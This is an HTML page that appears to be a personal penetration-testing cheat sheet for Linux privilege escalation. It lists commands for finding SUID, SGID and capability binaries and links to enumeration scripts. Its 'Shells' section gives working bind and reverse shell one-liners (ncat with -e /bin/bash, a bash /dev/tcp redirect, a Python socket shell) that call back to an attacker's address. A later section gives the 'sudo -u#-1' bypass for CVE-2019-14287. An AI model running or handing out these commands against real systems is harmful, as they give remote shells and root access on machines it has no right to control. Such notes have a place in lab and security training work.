<!DOCTYPE HTML>
<!--
	html5up.net | 
	Free for personal and commercial use under the CCA 3.0 license (html5up.net/license)
-->
<html>
	<head>
		<title>SUIDs</title>
		
		<!DOCTYPE html>
		<html>
		
		<head>
			<title></title>
		</head>
		
		<!DOCTYPE html>
<html>

<head>
    <title></title>
</head>

<!DOCTYPE html>
<html>

<head>
    <title></title>
</head>

<body>
    <p style="text-align: center;"><strong><span style="color: rgb(250, 197, 28); font-size: 24px;"><u>GTFO Bins</u></span></strong></p>
    <p><span style="font-size: 20px;"><a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></span></p>
    <p><span style="font-size: 20px;"><br></span></p>
    <p style="text-align: center;"><span style="color: rgb(147, 101, 184); font-size: 24px;"><strong><u>Find SUIDs</u></strong></span></p>
    <p><span style="font-size: 24px;"><strong>how to find another users capabilities or sudo permissions?</strong></span></p>
    <p><span style="font-size: 24px;">find / - user &lt;name&gt; -perm -4000 2&gt;/dev/null</span></p>
    <p><span style="font-size: 24px;">find / -perm -u=s -type f 2&gt;/dev/null</span></p>
    <p><span style="font-size: 24px;"><strong>SGID</strong></span></p>
    <p><span style="font-size: 24px;">find / -perm /2000</span></p>
    <p><span style="font-size: 24px;"><strong>Both SUID and SGID</strong></span></p>
    <p><span style="font-size: 24px;">find / -perm /6000</span></p>
    <p><strong><span style="font-size: 24px;">Capabilities</span></strong></p>
    <p><span style="font-size: 24px;">getcap -r / 2&gt;/dev/null</span></p>
    <p style='font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; letter-spacing: normal; orphans: 2; text-align: center; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-decoration-style: initial; text-decoration-color: initial; box-sizing: border-box; margin-top: 24px; margin-bottom: 16px; font-weight: 600; font-size: 1.5em; line-height: 1; padding-bottom: 0.3em; border-bottom: 1px solid var(--color-border-secondary); color: rgb(36, 41, 46); font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji"; background-color: rgb(255, 255, 255);'><span style='font-family: "Times New Roman", Times, serif; font-size: 24px;'><strong><u><span style="color: rgb(251, 160, 38);">Shells</span></u></strong></span></p>
    <p style='font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; letter-spacing: normal; orphans: 2; text-align: left; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-decoration-style: initial; text-decoration-color: initial; box-sizing: border-box; margin-top: 24px; margin-bottom: 16px; font-weight: 600; font-size: 1.5em; line-height: 1; padding-bottom: 0.3em; border-bottom: 1px solid var(--color-border-secondary); color: rgb(36, 41, 46); font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji"; background-color: rgb(255, 255, 255);'><span style="font-size: 24px;"><span style="font-family: 'Times New Roman', Times, serif;"><a aria-hidden="true" class="anchor" href="https://github.com/NavKang/NavKang/blob/gh-pages/shells.md#start-bind-shell-on-victim" style="box-sizing: border-box; background-color: transparent; color: var(--color-text-link); text-decoration: none; float: left; padding-right: 4px; margin-left: -20px; line-height: 1;"></a>Start bind shell (on victim):</span></span></p>
    <p><span style="font-size: 24px;"><span style="font-family: 'Times New Roman', Times, serif;">ncat -l -p PORT -e &quot;/bin/bash -i&quot;</span></span></p>
    <p style='font-size: 16px; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-decoration-style: initial; text-decoration-color: initial; box-sizing: border-box; margin-top: 24px; margin-bottom: 16px; font-weight: 600; line-height: 1.25; color: rgb(36, 41, 46); font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji"; background-color: rgb(255, 255, 255);'><span style="font-size: 24px;"><span style="font-family: 'Times New Roman', Times, serif;"><a aria-hidden="true" class="anchor" href="https://github.com/NavKang/NavKang/blob/gh-pages/shells.md#connect-to-bind-shell-on-attacker" style="box-sizing: border-box; background-color: transparent; color: var(--color-text-link); text-decoration: none; float: left; padding-right: 4px; margin-left: -20px; line-height: 1;"></a>Connect to bind shell (on attacker):</span></span></p>
    <p><span style="font-size: 24px;"><span style="font-family: 'Times New Roman', Times, serif;">ncat --ip-- --port--</span></span></p>
    <p style='font-size: 16px; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-decoration-style: initial; text-decoration-color: initial; box-sizing: border-box; margin-top: 24px; margin-bottom: 16px; font-weight: 600; line-height: 1.25; color: rgb(36, 41, 46); font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji"; background-color: rgb(255, 255, 255);'><span style="font-size: 24px;"><span style="font-family: 'Times New Roman', Times, serif;">Listen for reverse shell (on attacker):</span></span></p>
    <p><span style="font-size: 24px;"><span style="font-family: 'Times New Roman', Times, serif;">ncat -l -p PORT</span></span></p>
    <p style='font-size: 16px; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-decoration-style: initial; text-decoration-color: initial; box-sizing: border-box; margin-top: 24px; margin-bottom: 16px; font-weight: 600; line-height: 1.25; color: rgb(36, 41, 46); font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji"; background-color: rgb(255, 255, 255);'><span style="font-size: 24px;"><span style="font-family: 'Times New Roman', Times, serif;">Start reverse shell (on victim):</span></span></p>
    <p><span style="font-size: 24px;"><span style="font-family: 'Times New Roman', Times, serif;">ncat -e &quot;/bin/bash -i&quot; IPaddr</span></span></p>
    <p><span style="font-size: 24px;"><strong>upgrade shell</strong></span></p>
    <p><span style="font-size: 24px;">python -c &apos;import pty; pty.spawn(&quot;/bin/bash&quot;)&apos;</span></p>
    <p><span style="font-size: 24px;"><strong>Reverse Shell</strong></span></p>
    <p><span style="font-size: 24px;">bash -c "bash -i >& /dev/tcp/(tun0 ip add)/4444 0>&1" - Useful if you find a .sh file on remote system</span></p>
    <p><span style="font-size: 24px;"><strong>Python Reverse Shell</strong></span></p>
    <p><span style="font-size: 24px;">python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<IP>,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span></p>
    <p><span style="font-size: 24px;"><strong><u>Useful site for upgrading shells:</u></strong></span></p>
    <p><a href="https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys"><span style="font-size: 24px;">https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys</span></a></p>
        <p><br></p>
    <p style="text-align: center;"><strong><span style="font-size: 24px; color: rgb(243, 121, 52);"><u>Enumeration &amp; Priv Esc Scripts</u></span></strong></p>
    <p><span style="font-size: 24px;">LinENUM script: &nbsp;<a href="https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh">Download a local copy of LinEnum</a></span></p>
    <p><span style="font-size: 24px;">Linpeas script: <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS">Download a copy of Linpeas&nbsp;</a></span></p>
    <p><span style="font-size: 24px;">lse.sh script: <a href="https://github.com/diego-treitos/linux-smart-enumeration">Download a copy of lse</a>&nbsp;</span></p>
    <br>
    <p style="text-align: center;"><span style="font-size: 24px;"><strong><u><span style="color: rgb(41, 105, 176);">Sudo Information: Usage and Vulnerability</span></u></strong></span></p>
    <p><span style="font-size: 24px;"><strong>Usage:</strong></span></p>
    <ul>
        <li><span style="font-size: 24px;">normally it is: <strong>Sudo &lt;command&gt;</strong></span></li>
        <li><span style="font-size: 24px;">you can specify manually: <strong>sudo -u#&lt;id&gt; &nbsp; &lt;command&gt;</strong></span></li>
        <li><span style="font-size: 24px;">the config file is <strong>/etc/sudoers</strong></span></li>
        <li><span style="font-size: 24px;">if you wish to edit then use: <strong>sudo visudo</strong></span></li>
    </ul>
    <p><span style="font-size: 24px;"><strong>What is the vulnerability:</strong></span></p>
    <p><span style="font-size: 24px;">Sudo vulnerability found in version &lt; 1.8.28 - <span style='font-size: 24px; line-height: 107%; font-family: "Times New Roman", Times, serif; color: rgb(33, 37, 41);'>CVE-2019-14287</span><span style='font-size:15px;line-height:107%;font-family:"Courier New";color:#212529;'>&nbsp;</span></span></p>
    <p><span style='font-family: "Times New Roman", Times, serif; font-size: 24px;'>issue stems from the following entry in sudoers:</span></p>
    <p><span style="font-size: 24px;"><span style="font-family: 'Times New Roman', Times, serif;"><strong>{user name} ALL=(ALL:!root_ NOPASSWD: ALL</strong></span></span></p>
    <p style='margin-right:0cm;margin-left:0cm;font-size:15px;font-family:"Calibri",sans-serif;margin-top:0cm;margin-bottom:8.0pt;line-height:107%;background:white;'><span style='font-family: "Times New Roman", Times, serif; font-size: 24px;'>this would prevent anyone running as superuser/admin, so<strong>&nbsp;sudo -u#0</strong> will not work, however, <strong>sudo -u#-1</strong> will work.</span></p>
    <p style='margin-right:0cm;margin-left:0cm;font-size:15px;font-family:"Calibri",sans-serif;margin-top:0cm;margin-bottom:8.0pt;line-height:107%;background:white;'><br></p>
    <p style='margin-right:0cm;margin-left:0cm;font-size:15px;font-family:"Calibri",sans-serif;margin-top:0cm;margin-bottom:8.0pt;line-height:107%;background:white;'><span style='font-family: "Times New Roman", Times, serif; font-size: 24px;'><strong>sudo -u#-1&nbsp;</strong></span><span style='font-family: "Times New Roman", Times, serif; font-size: 18px;'>(unsigned equivalent <span style='line-height: 107%; font-family: "Times New Roman", Times, serif; color: rgb(33, 37, 41);'>4294967295</span></span><span style='font-family: "Times New Roman", Times, serif; font-size: 24px;'><span style='line-height: 107%; font-family: "Courier New"; color: rgb(33, 37, 41);'>)</span><span style='line-height: 107%; font-family: "Times New Roman", Times, serif; color: rgb(33, 37, 41);'><strong>(command)</strong></span></span></p>
    <p style='margin-right:0cm;margin-left:0cm;font-size:15px;font-family:"Calibri",sans-serif;margin-top:0cm;margin-bottom:8.0pt;line-height:107%;background:white;'><br></p>
    <p style='margin-right:0cm;margin-left:0cm;font-size:15px;font-family:"Calibri",sans-serif;margin-top:0cm;margin-bottom:8.0pt;line-height:107%;background:white;'><span style='font-family: "Times New Roman", Times, serif; font-size: 24px;'><span style="line-height: 107%; color: rgb(33, 37, 41);">Note: only works if you have non root permission</span></span></p>
    <p><br></p>
    <p><br></p>    


</body>

</html>

</html>
		
		</html>



</html>